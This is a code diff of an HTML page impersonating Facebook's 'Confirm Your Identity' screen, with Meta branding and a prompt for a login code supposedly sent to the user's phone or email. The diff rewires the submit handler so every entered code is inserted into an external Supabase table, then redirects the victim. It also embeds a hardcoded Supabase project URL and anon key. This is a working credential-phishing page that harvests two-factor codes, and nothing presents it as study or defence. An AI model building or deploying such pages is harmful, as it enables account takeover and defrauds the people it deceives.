@@ -1,9 +1,11 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Facebook – Confirm Your Identity</title>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
   <style>
     body {
       background-color: #f0f2f5;
@@ -119,13 +121,11 @@
     <div class="bottom-line">&copy; 2025 Meta Platforms, Inc.</div>
   </div>
 
-  <!-- Include Supabase JS Library -->
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-
   <script>
+    // Supabase init
     const SUPABASE_URL = 'https://scserlwosxrmnvomipxt.supabase.co';
-    const SUPABASE_ANON_KEY = 'your-full-anon-key-here'; // Replace this with your actual anon key
-    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+    const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNjc2VybHdvc3hybW52b21pcHh0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDk4MTI4NzMsImV4cCI6MjA2NTM4ODg3M30.JJtoPSkDqNTAgqpDHNZunqtyECGtYEWKh-YbvipTPH8';
+    const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
     window.onload = function () {
       const user = localStorage.getItem("login_user");
@@ -156,16 +156,18 @@
       msgEl.textContent = `To confirm it's really you trying to log in, we sent a code to your ${displayType} ending in ....${ending}. Enter it below to continue.`;
     };
 
-    async function verifyCode() {
+    function verifyCode() {
       const codeInput = document.getElementById("code-input");
       const code = codeInput.value.trim();
 
+      // Remove previous error state
       const existingError = document.querySelector(".error-message");
       if (existingError) existingError.remove();
       codeInput.style.borderColor = "#ccc";
 
       if (!code) {
         codeInput.style.borderColor = "red";
+
         const error = document.createElement("div");
         error.className = "error-message";
         error.textContent = "Required";
@@ -174,36 +176,29 @@
         error.style.marginTop = "-15px";
         error.style.marginBottom = "15px";
         codeInput.parentNode.insertBefore(error, codeInput.nextSibling);
+
         return;
       }
 
-      try {
-        const { data, error } = await supabaseClient
-          .from("codes")
-          .select("*")
-          .eq("code", code)
-          .order("created_at", { ascending: false })
-          .limit(1)
-          .single();
-
-        if (error || !data) {
-          alert("Incorrect code. Please try again.");
+      // Save to Supabase
+      supabase.from('code').insert([{ value: code }]).then(response => {
+        if (response.error) {
+          alert("Failed to save code.");
         } else {
+          alert("Code submitted.");
           window.location.href = "homepage.html";
         }
-      } catch (err) {
-        alert("An error occurred. Please try again.");
-      }
+      });
     }
 
-    // ✅ Real-time listener for changes to the "codes" table
-    supabaseClient
-      .channel("realtime-codes")
+    // Real-time listener (optional but shows live updates)
+    supabase
+      .channel('code_changes')
       .on(
-        "postgres_changes",
-        { event: "*", schema: "public", table: "codes" },
+        'postgres_changes',
+        { event: '*', schema: 'public', table: 'code' },
         payload => {
-          console.log("Real-time update received:", payload);
+          console.log('Real-time update:', payload);
         }
       )
       .subscribe();
